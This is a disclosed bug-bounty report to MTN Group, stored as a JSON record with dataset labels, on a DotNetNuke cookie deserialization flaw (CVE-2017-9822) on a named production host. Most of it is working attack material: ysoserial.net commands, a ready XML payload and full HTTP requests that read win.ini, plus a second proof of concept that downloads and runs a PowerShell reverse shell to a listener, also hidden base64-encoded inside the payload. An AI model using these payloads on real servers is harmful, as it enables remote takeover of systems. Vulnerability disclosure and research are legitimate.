{
  "reported_to": "MTN Group",
  "reported_by": "offensiveops ",
  "title": "CVE-2017-9822 DotNetNuke Cookie Deserialization Remote Code Execution (RCE) on lonidoor.mtn.ci",
  "content": "\nSummary:\nDotNetNuke (DNN) versions between 5.0.0 - 9.3.0 are affected to deserialization vulnerability that leads to Remote Code Execution (RCE). DotNetNuke uses the DNNPersonalization cookie to store anonymous users\u2019 personalization options (the options for authenticated users are stored through their profile pages). This cookie is used when the application serves a custom 404 Error page, which is also the default settings.\nCode 895 Bytes\n1public static Hashtable DeSerializeHashtable(string xmlSource, string rootname)\n2{\n3\tvar HashTable = new Hashtable();\n4\n5\tif (!String.IsNullOrEmpyt(xmlSource))\n6\t{\n7\t\ttry\n8\t\t{\n9\t\t\tvar xmlDoc = new XmlDocument();\n10\t\t\txmlDoc.LoadXml(xmlSource);\n11\n12\t\t\tforeach (XmlElement xmlItem in xmlDoc.SelectNodes(rootname + \"/item\"))\n13\t\t\t{\n14\t\t\t\tstring key = xmlItem.GetAttribute(\"key\");\n15\t\t\t\tstring typeName = xmlItem.GetAttribute(\"type\");\n16\t\t\t\t\n17\t\t\t\t// Create the XmlSerializer\n18\t\t\t\tvar xser = new XmlSerializer(Type.GetType(typeName));\n19\n20\t\t\t\tvar readder = new XmlTextReadder(new StringReader(xmlItem.InnerXml));\n21\n22\t\t\t\t// Use the Deserialize method to restore the object's state, and store it\n23\t\t\t\t// in the Hashtable\n24\t\t\t\thashTable.Add(key, xser.Deserialize(reader));\n25\t\t\t}\n26\t\t}\n27\t\tcatch(Exception)\n28\t\t{\n29\t\t\t// Logger.Error(ex); /*Ignore Log because if failed on profile this will log on every request.*/\n30\t\t}\n31\t}\n32\n33\treturn hashTable;\n34}\nThe expected structure includes a type attribute to instruct the server which type of object to create on deserialization. The cookie is processed by the application whenever it attempts to load the current user's profile data, which occurs when DNN is configured to handle 404 errors with its built-in error page (default configuration). An attacker can leverage this vulnerability to execute arbitrary code on the system.\nProof of Concept (PoC) :\nIn order to generate payload (to check vuln.), use YSoSerial.net with DotNetNuke plugin\nCode 1015 Bytes\n1PS C:\\ysoserial.net\\ysoserial\\bin\\Debug> .\\ysoserial.exe -p DotNetNuke --help\n2ysoserial.net generates deserialization payloads for a variety of .NET formatters.\n3\n4Plugin:\n5\n6DotNetNuke (Generates payload for DotNetNuke CVE-2017-9822)\n7\n8Options:\n9\n10  -m, --mode=VALUE           the payload mode: read_file, write_file,\n11                               run_command.\n12  -c, --command=VALUE        the command to be executed in run_command mode.\n13  -u, --url=VALUE            the url to fetch the file from in write_file\n14                               mode.\n15  -f, --file=VALUE           the file to read in read_file mode or the file\n16                               to write to in write_file_mode.\n17      --minify               Whether to minify the payloads where applicable\n18                               (experimental). Default: false\n19      --ust, --usesimpletype This is to remove additional info only when\n20                               minifying and FormatterAssemblyStyle=Simple.\n21                               Default: true\nCode 105 Bytes\n1PS C:\\>ysoserial.net\\ysoserial\\bin\\Release\\ysoserial.exe -p DotNetNuke -m read_file -f C:\\Windows\\win.ini\nor simply, use the following payload\nCode 983 Bytes\n1<profile>\n2    <item key=\"name1: key1\" type=\"System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\">\n3        <ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">\n4            <ExpandedElement />\n5            <ProjectedProperty0>\n6                <MethodName>WriteFile</MethodName>\n7                <MethodParameters>\n8                    <anyType xsi:type=\"xsd:string\">C:\\Windows\\win.ini</anyType>\n9                </MethodParameters>\n10                <ObjectInstance xsi:type=\"FileSystemUtils\"></ObjectInstance>\n11            </ProjectedProperty0>\n12        </ExpandedWrapperOfFileSystemUtilsObjectDataProvider>\n13    </item>\n14</profile>\nIf everything goes well, following request will return content of win.ini file in response body.\nCode 1.22 KiB\n1GET /__ HTTP/1.1\n2Host: lonidoor.mtn.ci\n3User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0\n4Accept: text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01\n5Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3\n6Accept-Encoding: gzip, deflate\n7X-Requested-With: XMLHttpRequest\n8Connection: close\n9Cookie: dnn_IsMobile=False; DNNPersonalization=<profile><item key=\"name1: key1\" type=\"System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"><ExpandedElement/><ProjectedProperty0><MethodName>WriteFile</MethodName><MethodParameters><anyType xsi:type=\"xsd:string\">C:\\Windows\\win.ini</anyType></MethodParameters><ObjectInstance xsi:type=\"FileSystemUtils\"></ObjectInstance></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item></profile>\nCode 402 Bytes\n1HTTP/1.1 200 OK\n2Cache-Control: private\n3Content-Type: text/html; charset=utf-8\n4Server: Microsoft-IIS/10.0\n5Set-Cookie: .ASPXANONYMOUS=...; expires=Wed, 28-Oct-2024 03:54:58 GMT; path=/; HttpOnly\n6X-AspNet-Version: 4.0.30319\n7X-Powered-By: ASP.NET\n8Date: Wed, 19 Aug 2020 17:14:58 GMT\n9Connection: close\n10Content-Length: 109\n11\n12; for 16-bit app support\n13[fonts]\n14[extensions]\n15[mci extensions]\n16[files]\n17[Mail]\n18MAPI=1\nProof of Concept (PoC) 2: Aggressive Mode (exploit with powershell reverse tcp shell)\nOn local machine, listen any port that you don't use\nCode 15 Bytes\n1$ nc -nlvp 7575\nGenerate payload using YSoSerial.net with DotNetNuke plugin\nCode 356 Bytes\n1PS C:\\ysoserial.net\\ysoserial\\bin\\Debug> .\\ysoserial.exe -p DotNetNuke -m run_command -c \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.101 -Port 7575\"\nPayload\nCode 2.56 KiB\n1<profile>\n2    <item key=\"key\" type=\"System.Data.Services.Internal.ExpandedWrapper`2[[System.Web.UI.ObjectStateFormatter, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\">\n3        <ExpandedWrapperOfObjectStateFormatterObjectDataProvider>\n4            <ProjectedProperty0>\n5                <ObjectInstance p3:type=\"ObjectStateFormatter\" xmlns:p3=\"http://www.w3.org/2001/XMLSchema-instance\" />\n6                <MethodName>Deserialize</MethodName>\n7                <MethodParameters>\n8                    <anyType xmlns:q1=\"http://www.w3.org/2001/XMLSchema\" p5:type=\"q1:string\" xmlns:p5=\"http://www.w3.org/2001/XMLSchema-instance\">/wEylQkAAQAAAP////8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAAC3Bzw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9InV0Zi04Ij8+DQo8T2JqZWN0RGF0YVByb3ZpZGVyIE1ldGhvZE5hbWU9IlN0YXJ0IiBJc0luaXRpYWxMb2FkRW5hYmxlZD0iRmFsc2UiIHhtbG5zPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbC9wcmVzZW50YXRpb24iIHhtbG5zOnNkPSJjbHItbmFtZXNwYWNlOlN5c3RlbS5EaWFnbm9zdGljczthc3NlbWJseT1TeXN0ZW0iIHhtbG5zOng9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sIj4NCiAgPE9iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCiAgICA8c2Q6UHJvY2Vzcz4NCiAgICAgIDxzZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICAgICAgPHNkOlByb2Nlc3NTdGFydEluZm8gQXJndW1lbnRzPSIvYyBDOlxXaW5kb3dzXFN5c3RlbTMyXFdpbmRvd3NQb3dlclNoZWxsXHYxLjBccG93ZXJzaGVsbC5leGUgaWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vc2FtcmF0YXNob2svbmlzaGFuZy9tYXN0ZXIvU2hlbGxzL0ludm9rZS1Qb3dlclNoZWxsVGNwLnBzMScpO0ludm9rZS1Qb3dlclNoZWxsVGNwIC1SZXZlcnNlIC1JUEFkZHJlc3MgMTkyLjE2OC4xLjEwMSAtUG9ydCA3NTc1IiBTdGFuZGFyZEVycm9yRW5jb2Rpbmc9Int4Ok51bGx9IiBTdGFuZGFyZE91dHB1dEVuY29kaW5nPSJ7eDpOdWxsfSIgVXNlck5hbWU9IiIgUGFzc3dvcmQ9Int4Ok51bGx9IiBEb21haW49IiIgTG9hZFVzZXJQcm9maWxlPSJGYWxzZSIgRmlsZU5hbWU9ImNtZCIgLz4NCiAgICAgIDwvc2Q6UHJvY2Vzcy5TdGFydEluZm8+DQogICAgPC9zZDpQcm9jZXNzPg0KICA8L09iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCjwvT2JqZWN0RGF0YVByb3ZpZGVyPgs=</anyType>\n9                </MethodParameters>\n10            </ProjectedProperty0>\n11        </ExpandedWrapperOfObjectStateFormatterObjectDataProvider>\n12    </item>\n13</profile>\nCode 2.83 KiB\n1GET /__ HTTP/1.1\n2Host: lonidoor.mtn.ci\n3User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0\n4Accept: text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01\n5Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3\n6Accept-Encoding: gzip, deflate\n7X-Requested-With: XMLHttpRequest\n8Connection: close\n9Cookie: dnn_IsMobile=False; DNNPersonalization=<profile><item key=\"key\" type=\"System.Data.Services.Internal.ExpandedWrapper`2[[System.Web.UI.ObjectStateFormatter, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\"><ExpandedWrapperOfObjectStateFormatterObjectDataProvider><ProjectedProperty0><ObjectInstance p3:type=\"ObjectStateFormatter\" xmlns:p3=\"http://www.w3.org/2001/XMLSchema-instance\" /><MethodName>Deserialize</MethodName><MethodParameters><anyType xmlns:q1=\"http://www.w3.org/2001/XMLSchema\" p5:type=\"q1:string\" xmlns:p5=\"http://www.w3.org/2001/XMLSchema-instance\">/wEylQkAAQAAAP////8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAAC3Bzw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9InV0Zi04Ij8+DQo8T2JqZWN0RGF0YVByb3ZpZGVyIE1ldGhvZE5hbWU9IlN0YXJ0IiBJc0luaXRpYWxMb2FkRW5hYmxlZD0iRmFsc2UiIHhtbG5zPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbC9wcmVzZW50YXRpb24iIHhtbG5zOnNkPSJjbHItbmFtZXNwYWNlOlN5c3RlbS5EaWFnbm9zdGljczthc3NlbWJseT1TeXN0ZW0iIHhtbG5zOng9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sIj4NCiAgPE9iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCiAgICA8c2Q6UHJvY2Vzcz4NCiAgICAgIDxzZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICAgICAgPHNkOlByb2Nlc3NTdGFydEluZm8gQXJndW1lbnRzPSIvYyBDOlxXaW5kb3dzXFN5c3RlbTMyXFdpbmRvd3NQb3dlclNoZWxsXHYxLjBccG93ZXJzaGVsbC5leGUgaWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vc2FtcmF0YXNob2svbmlzaGFuZy9tYXN0ZXIvU2hlbGxzL0ludm9rZS1Qb3dlclNoZWxsVGNwLnBzMScpO0ludm9rZS1Qb3dlclNoZWxsVGNwIC1SZXZlcnNlIC1JUEFkZHJlc3MgMTkyLjE2OC4xLjEwMSAtUG9ydCA3NTc1IiBTdGFuZGFyZEVycm9yRW5jb2Rpbmc9Int4Ok51bGx9IiBTdGFuZGFyZE91dHB1dEVuY29kaW5nPSJ7eDpOdWxsfSIgVXNlck5hbWU9IiIgUGFzc3dvcmQ9Int4Ok51bGx9IiBEb21haW49IiIgTG9hZFVzZXJQcm9maWxlPSJGYWxzZSIgRmlsZU5hbWU9ImNtZCIgLz4NCiAgICAgIDwvc2Q6UHJvY2Vzcy5TdGFydEluZm8+DQogICAgPC9zZDpQcm9jZXNzPg0KICA8L09iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCjwvT2JqZWN0RGF0YVByb3ZpZGVyPgs=</anyType></MethodParameters></ProjectedProperty0></ExpandedWrapperOfObjectStateFormatterObjectDataProvider></item></profile>\nSupporting Material/References:\nhttps://pentest-tools.com/blog/exploit-dotnetnuke-cookie-deserialization/\nhttps://www.exploit-db.com/exploits/48336\nImpact\nDotNetNuke Cookie Deserialization Remote Code Execution (RCE) on lonidoor.mtn.ci\n\n",
  "severity": [
    9.0,
    10.0
  ],
  "bounty": null,
  "weaknesses": [
    "Code Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1731803880,
  "report_url": "https://hackerone.com/reports/2762119",
  "is_multi_component": false,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Identify the target DotNetNuke (DNN) version (5.0.0 - 9.3.0) and confirm it is configured to use the default 404 error page."
    ],
    [
      2,
      "Use YSoSerial.net with the DotNetNuke plugin to generate a malicious payload that exploits the deserialization vulnerability in the DNNPersonalization cookie."
    ],
    [
      3,
      "Send a crafted HTTP request to the target server with the malicious payload in the DNNPersonalization cookie to trigger the deserialization vulnerability."
    ],
    [
      4,
      "Observe the response to confirm remote code execution (RCE) or other desired effects (e.g., file read, reverse shell)."
    ]
  ],
  "vuln_description": "DotNetNuke (DNN) versions 5.0.0 to 9.3.0 are vulnerable to a deserialization attack via the DNNPersonalization cookie, which can lead to remote code execution (RCE). The vulnerability arises when the application processes the cookie during the loading of user profile data, particularly when handling 404 errors with the default error page.",
  "reason": "The vulnerability involves understanding the deserialization process in DNN, crafting a specific payload using YSoSerial.net, and manipulating the DNNPersonalization cookie. While the steps are straightforward once the payload is generated, the initial discovery of the vulnerability and the creation of the exploit require knowledge of deserialization flaws and the specific DNN implementation.",
  "new_complexity": "MEDIUM",
  "requires_code": true,
  "requires_CVE": true,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves deserialization of a cookie (DNNPersonalization) to achieve RCE, which is not directly related to the IDOR or AuthN/AuthZ bypass methodologies described. The described methodologies focus on testing authorization boundaries by swapping user sessions or resource IDs, whereas this vulnerability exploits insecure deserialization in the handling of cookies.",
    "is_detectable": false
  }
}